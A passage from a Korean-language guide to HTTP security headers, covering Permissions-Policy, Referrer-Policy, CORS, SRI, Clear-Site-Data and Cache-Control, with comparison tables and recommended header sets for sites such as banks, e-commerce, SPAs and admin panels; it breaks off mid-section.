└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 9. 기능 제어 헤더

## 9.1 Permissions-Policy (구 Feature-Policy)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Permissions-Policy                                               │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  역사:                                                                        │
│  Feature-Policy (2019) → Permissions-Policy (2020)                           │
│  이름 변경 이유: "기능"이 아니라 "권한"을 제어하는 것이 정확한 의미론            │
│                                                                              │
│  문법 변경:                                                                   │
│  Feature-Policy: camera 'none'; microphone 'self'         (구)               │
│  Permissions-Policy: camera=(), microphone=(self)          (신)               │
│                                                                              │
│  헤더:                                                                        │
│  Permissions-Policy: camera=(), microphone=(), geolocation=(self),           │
│    payment=(self "https://pay.example.com"), usb=()                          │
│                                                                              │
│  값 문법:                                                                     │
│  ─────────────────────────────────────────────────────────────────            │
│  ()           기능 완전 차단 (Feature-Policy의 'none')                        │
│  *            모든 출처 허용                                                  │
│  (self)       현재 출처만 허용                                                │
│  ("https://a.com")  특정 출처 허용                                           │
│  (self "https://a.com")  self + 특정 출처                                    │
│                                                                              │
│  주요 기능 목록 (46개 중 핵심):                                                │
│  ─────────────────────────────────────────────────────────────────            │
│                                                                              │
│  ■ 센서/디바이스                                                              │
│  camera              카메라 접근                                              │
│  microphone          마이크 접근                                              │
│  geolocation         위치 정보                                                │
│  gyroscope           자이로스코프                                             │
│  accelerometer       가속도계                                                 │
│  magnetometer        자기계                                                   │
│  usb                 USB 디바이스                                             │
│  bluetooth           블루투스                                                 │
│  serial              시리얼 포트                                              │
│  hid                 HID 디바이스                                             │
│                                                                              │
│  ■ 화면/디스플레이                                                            │
│  fullscreen          전체 화면                                                │
│  display-capture     화면 캡처                                                │
│  picture-in-picture  PIP 모드                                                │
│                                                                              │
│  ■ 결제/인증                                                                  │
│  payment             Payment Request API                                     │
│  publickey-credentials-get   WebAuthn                                        │
│                                                                              │
│  ■ 성능/리소스                                                                │
│  sync-xhr            동기 XMLHttpRequest                                     │
│  document-domain     document.domain 수정                                    │
│  autoplay            자동 재생                                                │
│                                                                              │
│  ■ 추적 방지                                                                  │
│  interest-cohort     FLoC (Topics API)                                       │
│  browsing-topics     Topics API                                              │
│                                                                              │
│  권장 최소 설정:                                                              │
│  Permissions-Policy: camera=(), microphone=(), geolocation=(),               │
│    interest-cohort=(), browsing-topics=(), usb=(), bluetooth=(),             │
│    serial=(), hid=()                                                         │
│                                                                              │
│  ⚠️  사용하지 않는 기능은 명시적으로 차단하여                                   │
│     서드파티 스크립트가 몰래 접근하는 것을 방지                                 │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 9.2 Referrer-Policy

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Referrer-Policy                                                  │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  역사적 오타: HTTP 헤더 "Referer"는 RFC 1945 (1995)에서 "Referrer"를          │
│  "Referer"로 오타 낸 것이 표준으로 굳어진 것이다.                              │
│  Referrer-Policy 헤더는 올바른 철자 "Referrer"를 사용한다.                     │
│                                                                              │
│  문제: Referer 헤더를 통한 민감 정보 유출                                      │
│  ─────────────────────────────────────────────────────────────────            │
│  사용자가 https://hospital.com/patients/12345 에서                            │
│  외부 링크를 클릭하면:                                                        │
│  Referer: https://hospital.com/patients/12345                                │
│  → 환자 ID가 서드파티에 노출!                                                 │
│                                                                              │
│  값 옵션:                                                                     │
│  ─────────────────────────────────────────────────────────────────            │
│  no-referrer                                                                 │
│  └── Referer 헤더 전송 안 함 (가장 엄격)                                      │
│                                                                              │
│  no-referrer-when-downgrade (과거 기본값)                                    │
│  └── HTTPS→HTTP 이동 시 미전송, 그 외 전체 URL 전송                           │
│                                                                              │
│  origin                                                                      │
│  └── 출처(scheme+host+port)만 전송. 경로/쿼리 제외                            │
│      예: https://example.com (경로 없음)                                     │
│                                                                              │
│  origin-when-cross-origin                                                    │
│  ├── 동일 출처: 전체 URL 전송                                                 │
│  └── 교차 출처: origin만 전송                                                 │
│                                                                              │
│  same-origin                                                                 │
│  ├── 동일 출처: 전체 URL 전송                                                 │
│  └── 교차 출처: 미전송                                                        │
│                                                                              │
│  strict-origin  ★ 권장                                                       │
│  ├── 동일/교차 출처 무관 origin만 전송                                        │
│  └── HTTPS→HTTP 다운그레이드 시 미전송                                        │
│                                                                              │
│  strict-origin-when-cross-origin  ★ 브라우저 기본값 (2021~)                  │
│  ├── 동일 출처: 전체 URL                                                      │
│  ├── 교차 출처: origin만                                                      │
│  └── HTTPS→HTTP: 미전송                                                      │
│                                                                              │
│  unsafe-url  ⚠️ 위험                                                         │
│  └── 항상 전체 URL 전송 (경로, 쿼리 포함)                                     │
│                                                                              │
│  권장: strict-origin-when-cross-origin (기본값과 동일하지만 명시 권장)         │
│        또는 민감 데이터 사이트: no-referrer                                    │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 10. 기타 보안 헤더 (CORS, SRI, Clear-Site-Data, Cache-Control)

## 10.1 CORS (Cross-Origin Resource Sharing)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CORS — Same-Origin Policy의 통제된 완화                           │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Same-Origin Policy (SOP):                                                   │
│  출처(Origin) = scheme + host + port                                         │
│  https://example.com:443 ≠ http://example.com:443 (scheme 다름)             │
│  https://example.com ≠ https://api.example.com (host 다름)                  │
│  → 다른 출처의 리소스에 JavaScript로 접근 불가                                 │
│                                                                              │
│  CORS는 SOP를 "안전하게" 완화하는 메커니즘                                    │
│                                                                              │
│  Simple Request vs Preflight:                                                │
│  ─────────────────────────────────────────────────────────────────            │
│                                                                              │
│  Simple Request (Preflight 불필요):                                          │
│  ├── GET, HEAD, POST 메서드                                                  │
│  ├── Content-Type: text/plain, multipart/form-data, application/             │
│  │   x-www-form-urlencoded                                                   │
│  └── 커스텀 헤더 없음                                                         │
│                                                                              │
│  Preflight Request (OPTIONS):                                                │
│  ┌──────────┐                           ┌──────────┐                        │
│  │ 브라우저  │  OPTIONS /api/data         │ API 서버  │                        │
│  │          │  Origin: https://app.com   │          │                        │
│  │          │  Access-Control-Request-   │          │                        │
│  │          │    Method: PUT             │          │                        │
│  │          │  Access-Control-Request-   │          │                        │
│  │          │    Headers: Authorization  │          │                        │
│  │          │ ──────────────────────────▶│          │                        │
│  │          │                            │          │                        │
│  │          │  HTTP 204                  │          │                        │
│  │          │  Access-Control-Allow-     │          │                        │
│  │          │    Origin: https://app.com │          │                        │
│  │          │  Access-Control-Allow-     │          │                        │
│  │          │    Methods: GET,PUT,POST   │          │                        │
│  │          │  Access-Control-Allow-     │          │                        │
│  │          │    Headers: Authorization  │          │                        │
│  │          │  Access-Control-Max-Age:   │          │                        │
│  │          │    86400                   │          │                        │
│  │          │ ◀──────────────────────────│          │                        │
│  │          │                            │          │                        │
│  │          │  PUT /api/data  (실제 요청) │          │                        │
│  │          │ ──────────────────────────▶│          │                        │
│  └──────────┘                           └──────────┘                        │
│                                                                              │
│  주요 응답 헤더:                                                              │
│  ─────────────────────────────────────────────────────────────────            │
│  Access-Control-Allow-Origin: https://app.com | *                            │
│  Access-Control-Allow-Methods: GET, POST, PUT, DELETE                        │
│  Access-Control-Allow-Headers: Authorization, Content-Type                   │
│  Access-Control-Allow-Credentials: true                                      │
│  Access-Control-Expose-Headers: X-Custom-Header                              │
│  Access-Control-Max-Age: 86400                                               │
│                                                                              │
│  ⚠️  치명적 안티패턴:                                                          │
│  Access-Control-Allow-Origin: *                                              │
│  Access-Control-Allow-Credentials: true                                      │
│  → 브라우저가 거부함! * 와 Credentials는 동시 사용 불가                       │
│  → 반드시 구체적 Origin 지정                                                  │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 10.2 SRI (Subresource Integrity)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              SRI — CDN 변조 방어                                               │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  문제: 서드파티 CDN이 해킹되면 모든 사이트가 위험                               │
│  ─────────────────────────────────────────────────────────────────            │
│                                                                              │
│  사례: Polyfill.io 공급망 공격 (2024)                                        │
│  ├── Polyfill.io 도메인이 중국 기업에 매각                                    │
│  ├── CDN에서 악성 JavaScript 배포                                            │
│  ├── 40만+ 사이트에 악성 코드 주입                                            │
│  └── SRI를 적용한 사이트는 피해 없음 (해시 불일치 → 로드 차단)                 │
│                                                                              │
│  SRI 적용:                                                                    │
│  ─────────────────────────────────────────────────────────────────            │
│  <script src="https://cdn.example.com/lib.js"                                │
│          integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQl     │
│                     GYl1kPzQho1wx4JwY8wC"                                    │
│          crossorigin="anonymous">                                            │
│  </script>                                                                   │
│                                                                              │
│  <link rel="stylesheet" href="https://cdn.example.com/style.css"             │
│        integrity="sha256-BpfBw7ivV8q2jLiT13fxDYAe2tJllusRSZ273h2nFSE="     │
│        crossorigin="anonymous">                                              │
│                                                                              │
│  동작:                                                                        │
│  1. 브라우저가 리소스 다운로드                                                 │
│  2. 다운로드한 파일의 해시 계산                                                │
│  3. integrity 속성의 해시와 비교                                               │
│  4. 불일치 → 리소스 로드 차단, 네트워크 오류 발생                              │
│  5. 일치 → 정상 로드                                                          │
│                                                                              │
│  해시 생성:                                                                   │
│  cat lib.js | openssl dgst -sha384 -binary | openssl base64 -A               │
│  또는                                                                         │
│  shasum -b -a 384 lib.js | xxd -r -p | base64                                │
│                                                                              │
│  ⚠️  주의:                                                                    │
│  ├── CDN 파일 업데이트 시 해시도 함께 변경해야 함                              │
│  ├── crossorigin="anonymous" 필수 (CORS 필요)                                │
│  └── 동적 CDN (A/B 테스트, 지역별 다른 파일) 사용 시 적용 어려움               │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 10.3 Clear-Site-Data

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Clear-Site-Data — 클라이언트 데이터 일괄 삭제                      │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Clear-Site-Data: "cache", "cookies", "storage", "executionContexts"         │
│                                                                              │
│  값:                                                                          │
│  ─────────────────────────────────────────────────────────────────            │
│  "cache"               HTTP 캐시 삭제                                        │
│  "cookies"             쿠키 삭제                                              │
│  "storage"             localStorage, sessionStorage, IndexedDB 등 삭제       │
│  "executionContexts"   실행 컨텍스트 종료 (Service Worker 등)                 │
│  "*"                   모든 것 삭제                                           │
│                                                                              │
│  사용 시나리오:                                                               │
│  ─────────────────────────────────────────────────────────────────            │
│  1. 로그아웃 시:                                                              │
│     POST /logout → Clear-Site-Data: "cookies", "storage"                     │
│     → 세션 데이터 완전 제거                                                   │
│                                                                              │
│  2. 계정 탈취 의심 시:                                                        │
│     Clear-Site-Data: "*"                                                     │
│     → 모든 클라이언트 데이터 초기화                                           │
│                                                                              │
│  3. 보안 업데이트 후:                                                         │
│     Clear-Site-Data: "cache"                                                 │
│     → 캐시된 취약 리소스 강제 갱신                                            │
│                                                                              │
│  ⚠️  주의: HTTPS에서만 동작, 성능 영향 고려                                    │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 10.4 Cache-Control 보안 관점

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Cache-Control — 민감 데이터 캐시 방지                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  민감한 페이지 (인증된 콘텐츠, 개인정보):                                      │
│  Cache-Control: no-store, no-cache, must-revalidate, private                 │
│  Pragma: no-cache  (HTTP/1.0 하위 호환)                                      │
│  Expires: 0                                                                  │
│                                                                              │
│  no-store     캐시에 저장 자체를 금지 (가장 중요)                              │
│  no-cache     매번 서버에 재검증 요청                                          │
│  private      공유 캐시(CDN, 프록시) 저장 금지                                │
│  must-revalidate   만료 후 반드시 재검증                                      │
│                                                                              │
│  위험: 은행 페이지가 캐시되면                                                  │
│  → 공용 PC의 다음 사용자가 뒤로 가기로 계좌 정보 열람 가능                     │
│  → 프록시 서버에 인증된 콘텐츠 캐시 잔류                                       │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 11. 종합 비교표

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                              보안 헤더 종합 비교 매트릭스                                             │
├──────────────────┬──────────────┬──────────────┬──────────┬──────────┬──────────┬─────────────────┤
│ 헤더              │ 방어 대상     │ 브라우저 지원 │ 구현 복잡│ 성능 영향│ 부작용   │ 모니터링 가능   │
│                  │              │              │ 도       │          │ 위험     │                 │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ CSP              │ XSS, 데이터  │ 모든 최신     │ ★★★★★  │ 낮음     │ ★★★★★  │ ✅ Report-Only  │
│                  │ 주입, 클릭재킹│ 브라우저      │ (매우높음)│          │ (매우높음)│   + report-uri  │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ HSTS             │ SSL Strip,   │ 모든 최신     │ ★☆☆☆☆  │ 없음     │ ★★☆☆☆  │ ❌ 없음         │
│                  │ MITM, 쿠키   │ 브라우저      │ (매우낮음)│          │ (HTTP 장애)│                │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ X-Frame-Options  │ 클릭재킹     │ IE8+, 전체   │ ★☆☆☆☆  │ 없음     │ ★☆☆☆☆  │ ❌ 없음         │
│                  │              │              │ (매우낮음)│          │ (낮음)   │                 │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ X-Content-Type-  │ MIME 스니핑  │ IE8+, 전체   │ ★☆☆☆☆  │ 없음     │ ★☆☆☆☆  │ ❌ 없음         │
│ Options          │              │              │ (매우낮음)│          │ (매우낮음)│                 │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ Referrer-Policy  │ 정보 유출    │ 모든 최신     │ ★☆☆☆☆  │ 없음     │ ★★☆☆☆  │ ❌ 없음         │
│                  │              │ 브라우저      │ (매우낮음)│          │ (분석장애)│                │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ Permissions-     │ 기능 남용    │ Chrome, Edge │ ★★☆☆☆  │ 없음     │ ★★☆☆☆  │ ❌ 없음         │
│ Policy           │ (카메라 등)  │ (Firefox 부분)│ (낮음)   │          │ (기능장애)│                │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ COOP             │ Spectre,     │ Chrome, FF,  │ ★★★☆☆  │ 낮음     │ ★★★☆☆  │ ✅ Report-Only  │
│                  │ 윈도우 참조  │ Safari       │ (중간)   │ (프로세스)│ (팝업장애)│   + report-to  │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ COEP             │ Spectre,     │ Chrome, FF,  │ ★★★★☆  │ 낮음     │ ★★★★☆  │ ✅ Report-Only  │
│                  │ 데이터 유출  │ Safari       │ (높음)   │          │ (높음)   │   + report-to   │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ CORP             │ Spectre,     │ Chrome, FF,  │ ★☆☆☆☆  │ 없음     │ ★★☆☆☆  │ ❌ 없음         │
│                  │ 리소스 탈취  │ Safari       │ (매우낮음)│          │ (로드장애)│                │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ CORS             │ SOP 우회,    │ 모든 최신     │ ★★★☆☆  │ Preflight│ ★★★☆☆  │ ❌ 없음         │
│                  │ 데이터 유출  │ 브라우저      │ (중간)   │ 왕복추가 │ (API장애) │                │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ SRI              │ CDN 변조,    │ 모든 최신     │ ★★☆☆☆  │ 해시계산 │ ★★☆☆☆  │ ❌ 없음         │
│                  │ 공급망 공격  │ 브라우저      │ (낮음)   │ (미미)   │ (버전장애)│                │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ Clear-Site-Data  │ 잔류 데이터  │ Chrome, FF   │ ★☆☆☆☆  │ 삭제비용 │ ★★★☆☆  │ ❌ 없음         │
│                  │              │ (Safari 부분)│ (매우낮음)│          │ (데이터손실)│               │
├──────────────────┼──────────────┼──────────────┼──────────┼──────────┼──────────┼─────────────────┤
│ Cache-Control    │ 캐시 공격    │ 모든 브라우저 │ ★☆☆☆☆  │ 캐시미스 │ ★★☆☆☆  │ ❌ 없음         │
│ (보안 관점)      │              │              │ (매우낮음)│ 증가     │ (성능저하)│                 │
└──────────────────┴──────────────┴──────────────┴──────────┴──────────┴──────────┴─────────────────┘
```

---

# 12. 공격별 방어 헤더 매핑

```
┌──────────────────────────────────────────────────────────────────────────────────────────┐
│                     공격 유형별 방어 헤더 매핑                                              │
├──────────────────────────┬──────────────────────────┬────────────────────────────────────┤
│ 공격 유형                 │ 1차 방어 (Primary)        │ 2차 방어 (Secondary)               │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ Reflected XSS            │ CSP (nonce/strict-dynamic)│ X-Content-Type-Options            │
│                          │                          │ Trusted Types                      │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ Stored XSS               │ CSP (nonce/strict-dynamic)│ Trusted Types                     │
│                          │                          │ SRI (서드파티)                      │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ DOM-based XSS            │ Trusted Types            │ CSP (strict-dynamic)               │
│                          │                          │                                    │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ Clickjacking             │ CSP frame-ancestors      │ X-Frame-Options                    │
│                          │                          │                                    │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ SSL Stripping / MITM     │ HSTS (+ Preload)         │ upgrade-insecure-requests (CSP)    │
│                          │                          │                                    │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ MIME Confusion           │ X-Content-Type-Options   │ CSP default-src                    │
│                          │                          │                                    │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ Spectre / Side-channel   │ COOP + COEP              │ CORP                               │
│                          │                          │                                    │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ CDN 변조 / 공급망 공격    │ SRI                      │ CSP (script-src 제한)              │
│                          │                          │                                    │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ Referer 정보 유출         │ Referrer-Policy          │ (없음)                             │
│                          │                          │                                    │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ 디바이스 무단 접근        │ Permissions-Policy       │ (없음)                             │
│ (카메라/마이크/GPS)       │                          │                                    │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ 쿠키 탈취                │ HSTS + Secure Flag       │ Clear-Site-Data (로그아웃 시)       │
│                          │                          │                                    │
├──────────────────────────┼──────────────────────────┼────────────────────────────────────┤
│ 캐시 기반 정보 유출       │ Cache-Control: no-store  │ Clear-Site-Data                    │
│                          │                          │                                    │
└──────────────────────────┴──────────────────────────┴────────────────────────────────────┘
```

---

# 13. 시나리오별 최적 선택

## 13.1 정적 사이트 (블로그, 포트폴리오)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              정적 사이트 보안 헤더                                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 서버 사이드 렌더링 없음, 동적 스크립트 최소                              │
│                                                                              │
│  Content-Security-Policy:                                                    │
│    default-src 'self';                                                       │
│    script-src 'self';                                                        │
│    style-src 'self' 'unsafe-inline';                                         │
│    img-src 'self' data: https:;                                              │
│    font-src 'self' https://fonts.gstatic.com;                                │
│    connect-src 'self';                                                       │
│    frame-ancestors 'none';                                                   │
│    base-uri 'self';                                                          │
│    form-action 'self';                                                       │
│    object-src 'none'                                                         │
│                                                                              │
│  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload     │
│  X-Content-Type-Options: nosniff                                             │
│  X-Frame-Options: DENY                                                       │
│  Referrer-Policy: strict-origin-when-cross-origin                            │
│  Permissions-Policy: camera=(), microphone=(), geolocation=()                │
│  X-XSS-Protection: 0                                                         │
│                                                                              │
│  난이도: ★☆☆☆☆  부작용: 매우 낮음                                            │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.2 SPA (React, Vue, Angular)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              SPA 보안 헤더                                                     │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 번들링된 JS, API 통신 중심, CSR                                        │
│                                                                              │
│  Content-Security-Policy:                                                    │
│    default-src 'self';                                                       │
│    script-src 'self';                                                        │
│    style-src 'self' 'unsafe-inline';  (CSS-in-JS 사용 시)                    │
│    img-src 'self' data: blob: https:;                                        │
│    font-src 'self' https://fonts.gstatic.com;                                │
│    connect-src 'self' https://api.example.com wss://ws.example.com;          │
│    frame-ancestors 'none';                                                   │
│    base-uri 'self';                                                          │
│    object-src 'none'                                                         │
│                                                                              │
│  주의: SPA 프레임워크별 고려사항                                               │
│  ├── React: dangerouslySetInnerHTML 사용 시 Trusted Types 고려               │
│  ├── Vue: v-html 디렉티브 사용 주의                                           │
│  ├── Angular: bypassSecurityTrustHtml 최소화                                 │
│  └── CSS-in-JS: 'unsafe-inline' 불가피할 수 있음 (hash 사용 대안)             │
│                                                                              │
│  + HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy,           │
│    Permissions-Policy, X-XSS-Protection: 0                                   │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.3 REST API 서버

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              REST API 보안 헤더                                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: JSON 응답, HTML 렌더링 없음, CORS 필수                                 │
│                                                                              │
│  Content-Type: application/json; charset=utf-8                               │
│  X-Content-Type-Options: nosniff                                             │
│  Strict-Transport-Security: max-age=31536000; includeSubDomains              │
│  Cache-Control: no-store                        (인증된 응답)                 │
│  X-Frame-Options: DENY                                                       │
│  Content-Security-Policy: default-src 'none'; frame-ancestors 'none'         │
│                                                                              │
│  CORS (프론트엔드 출처 지정):                                                 │
│  Access-Control-Allow-Origin: https://app.example.com                        │
│  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS               │
│  Access-Control-Allow-Headers: Authorization, Content-Type                   │
│  Access-Control-Max-Age: 86400                                               │
│                                                                              │
│  ⚠️  API에서 HTML 렌더링 실수 방지:                                            │
│  Content-Type을 반드시 application/json으로 설정                               │
│  + nosniff로 브라우저가 HTML로 해석하는 것 방지                                │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.4 은행/금융 서비스

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              금융 서비스 보안 헤더 (최대 보안)                                   │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Content-Security-Policy:                                                    │
│    default-src 'none';                                                       │
│    script-src 'nonce-{RANDOM}' 'strict-dynamic';                             │
│    style-src 'self' 'nonce-{RANDOM}';                                        │
│    img-src 'self' data:;                                                     │
│    font-src 'self';                                                          │
│    connect-src 'self';                                                       │
│    frame-ancestors 'none';                                                   │
│    base-uri 'none';                                                          │
│    form-action 'self';                                                       │
│    object-src 'none';                                                        │
│    require-trusted-types-for 'script';                                       │
│    report-uri /csp-report                                                    │
│                                                                              │
│  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload     │
│  X-Content-Type-Options: nosniff                                             │
│  X-Frame-Options: DENY                                                       │
│  Referrer-Policy: no-referrer                                                │
│  Permissions-Policy: camera=(), microphone=(), geolocation=(),               │
│    payment=(self), usb=(), bluetooth=()                                      │
│  Cache-Control: no-store, no-cache, must-revalidate, private                 │
│  Pragma: no-cache                                                            │
│  Clear-Site-Data: "cache", "cookies", "storage"  (로그아웃 시)               │
│  X-XSS-Protection: 0                                                         │
│  Cross-Origin-Opener-Policy: same-origin                                     │
│  Cross-Origin-Embedder-Policy: require-corp                                  │
│  Cross-Origin-Resource-Policy: same-origin                                   │
│                                                                              │
│  NIST SP 800-53 매핑:                                                        │
│  ├── SI-3: 악성 코드 보호 (CSP, SRI)                                         │
│  ├── SC-8: 전송 기밀성 (HSTS)                                                │
│  └── AC-4: 정보 흐름 제어 (COOP/COEP/CORP, CORS)                             │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.5 이커머스

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              이커머스 보안 헤더                                                 │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 결제 연동, 서드파티 추적/분석, PCI DSS 준수                             │
│                                                                              │
│  Content-Security-Policy:                                                    │
│    default-src 'self';                                                       │
│    script-src 'nonce-{RANDOM}' 'strict-dynamic';                             │
│    style-src 'self' 'unsafe-inline';                                         │
│    img-src 'self' data: https://*.stripe.com https://*.analytics.com;        │
│    font-src 'self' https://fonts.gstatic.com;                                │
│    connect-src 'self' https://api.stripe.com https://*.analytics.com;        │
│    frame-src https://js.stripe.com https://hooks.stripe.com;                 │
│    frame-ancestors 'none';                                                   │
│    base-uri 'self';                                                          │
│    object-src 'none';                                                        │
│    report-uri /csp-report                                                    │
│                                                                              │
│  PCI DSS v4 (2024) 요구사항 6.4.3:                                           │
│  ├── 결제 페이지에서 실행되는 모든 스크립트의 인벤토리 관리                     │
│  ├── 각 스크립트의 목적과 정당성 문서화                                        │
│  └── 무결성 검증 메커니즘 적용 (CSP, SRI)                                     │
│                                                                              │
│  Shopify 사례: iframe 샌드박싱 + WebWorker로 서드파티 격리                    │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.6 관리자 패널

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              관리자 패널 보안 헤더                                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 고위험 기능, 최소 서드파티, 최대 보안                                    │
│                                                                              │
│  Content-Security-Policy:                                                    │
│    default-src 'none';                                                       │
│    script-src 'nonce-{RANDOM}' 'strict-dynamic';                             │
│    style-src 'self' 'nonce-{RANDOM}';                                        │
│    img-src 'self';                                                           │
│    font-src 'self';                                                          │
│    connect-src 'self';                                                       │
│    frame-ancestors 'none';                                                   │
│    base-uri 'none';                                                          │
│    form-action 'self';                                                       │
│    object-src 'none';                                                        │
│    require-trusted-types-for 'script'                                        │
│                                                                              │
│  → 가장 엄격한 CSP 적용 가능 (서드파티 의존성 최소)                            │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.7 CDN / 정적 자산 서버

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CDN / 정적 자산 서버 보안 헤더                                     │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 이미지, CSS, JS 파일 서빙, HTML 없음                                   │
│                                                                              │
│  X-Content-Type-Options: nosniff                                             │
│  Cross-Origin-Resource-Policy: cross-origin   (다른 사이트에서 로드 허용)     │
│  Access-Control-Allow-Origin: *               (또는 특정 출처)               │
│  Cache-Control: public, max-age=31536000, immutable                          │
│  Timing-Allow-Origin: *                       (성능 모니터링 허용)            │
│                                                                              │
│  ⚠️  CDN에는 CSP를 적용하지 않는 것이 일반적                                   │
│     (HTML을 서빙하지 않으므로 CSP가 무의미)                                    │
│                                                                              │
│  CDN이 JS를 서빙하는 경우:                                                    │
│  → 소비자 측에서 SRI를 적용하여 무결성 보장                                    │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.8 iframe 위젯

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              iframe 위젯 (임베드용 컴포넌트) 보안 헤더                          │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 다른 사이트에 iframe으로 삽입됨, CORS 필요                              │
│                                                                              │
│  Content-Security-Policy:                                                    │
│    default-src 'self';                                                       │
│    frame-ancestors https://partner-a.com https://partner-b.com;              │
│    script-src 'self' 'nonce-{RANDOM}'                                        │
│                                                                              │
│  X-Frame-Options: (설정하지 않거나 특정 출처 허용 불가 → frame-ancestors 사용) │
│  Cross-Origin-Resource-Policy: cross-origin                                  │
│                                                                              │
│  호스트 페이지 측 (삽입하는 쪽):                                               │
│  <iframe src="https://widget.example.com/embed"                              │
│          sandbox="allow-scripts allow-same-origin"                           │
│          allow="camera 'none'; microphone 'none'"                            │
│          loading="lazy">                                                     │
│  </iframe>                                                                   │
│                                                                              │
│  sandbox 속성으로 위젯 권한 최소화                                             │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.9 BFF (Backend for Frontend)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              BFF 패턴 보안 헤더                                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 프론트엔드 전용 백엔드, 토큰을 서버 측에서 관리                          │
│                                                                              │
│  BFF → 브라우저 응답:                                                         │
│  ├── CSP, HSTS 등 모든 보안 헤더 설정                                         │
│  ├── Set-Cookie: HttpOnly; Secure; SameSite=Strict                           │
│  └── Cache-Control: no-store (인증 응답)                                      │
│                                                                              │
│  BFF → API 서버 통신:                                                         │
│  ├── Authorization: Bearer {token} (서버 간, 브라우저 노출 없음)              │
│  └── 내부 네트워크 → CORS/보안 헤더 불필요                                    │
│                                                                              │
│  장점: 토큰이 브라우저에 노출되지 않아 XSS로 인한 토큰 탈취 불가               │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.10 내부 API / 마이크로서비스

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              내부 API 보안 헤더                                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 서비스 메시 내부, 브라우저 접근 없음                                     │
│                                                                              │
